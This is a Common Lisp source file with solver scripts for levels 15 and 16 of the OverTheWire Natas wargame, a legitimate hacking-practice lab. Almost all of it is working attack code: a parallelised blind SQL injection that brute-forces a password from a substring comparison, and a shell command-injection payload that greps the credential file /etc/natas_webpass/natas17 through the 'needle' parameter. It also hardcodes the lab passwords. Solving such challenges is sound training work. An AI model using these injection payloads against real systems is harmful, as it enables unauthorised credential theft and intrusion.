(in-package #:advent-of-code-2024.misc)

;;;;;;;;;;;;;;
;; Natas 15 ;;
;;;;;;;;;;;;;;

(defparameter *natas15-user* "natas15")
(defparameter *natas15-password* "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
(defparameter *natas15-url* "http://natas15.natas.labs.overthewire.org/")

(defparameter *valid-chars* '#.(loop
                                :for c :from (char-code #\0) :to (char-code #\z)
                                :for ch := (code-char c)
                                :when (alphanumericp ch)
                                  :collect ch))

(defun natas-15-send-request (pass ch n)
  (let ((response (dexador:post *natas15-url*
                                :headers '(("Content-Type" . "application/x-www-form-urlencoded"))
                                :basic-auth (cons *natas15-user* *natas15-password*)
                                :content `(("username" . ,(format nil "natas16\" AND BINARY ~
substring(password,1,~d) = '~a~c' -- " n pass ch)))
                                :insecure t
                                :connect-timeout 15
                                :use-connection-pool t)))
    (search "This user exists." response)))

(defun natas-15-brute-force (&key (password-length 32))
  (let ((lparallel:*kernel* (lparallel:make-kernel 8)))
   (loop
     :for pass := "" :then (format nil "~a~c" pass next)
     :for n :from 1 :to password-length
     :for next := (lparallel:pfind-if (lambda (ch) (natas-15-send-request pass ch n))
                                      *valid-chars*)
     :do (format t "n: ~a pass: ~a next: ~c~%" n pass next)
     :finally (return pass))))

;;;;;;;;;;;;;;
;; Natas 16 ;;
;;;;;;;;;;;;;;

(defparameter *natas16-user* "natas16")
(defparameter *natas16-password* "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")
(defparameter *natas16-url* "natas16.natas.labs.overthewire.org")

(defparameter *natas16-matching-chars* (coerce "05789bhjkoqsvwCEFHJLNOT" 'list))

(defun natas-16-send-request (pass ch)
  (let ((response (dexador:get (quri:make-uri
                                :scheme "http"
                                :port 80
                                :host *natas16-url*
                                :query `(("needle" . ,(format nil "$(grep -E ^~a~c /etc/natas_webpass/natas17)zigzag" pass ch))
                                         ("submit" . "Search")))
                                ;; :headers '(("Content-Type" . "application/x-www-form-urlencoded"))
                                :basic-auth (cons *natas16-user* *natas16-password*)
                                :insecure t
                                :connect-timeout 15
                                :use-connection-pool t)))
    (not (search "zigzag" response))))

(defun natas-16-brute-force (&key (password-length 32))
  (let ((lparallel:*kernel* (lparallel:make-kernel 16)))
    (loop
      :repeat password-length
      :for pass := "" :then (format nil "~a~c" pass next)
      :for next := (lparallel:pfind-if (a:curry #'natas-16-send-request pass) *valid-chars*)
      :do (format t "pass: ~a next: ~c~%" pass next)
      :finally (return (format nil "~a~c" pass next)))))
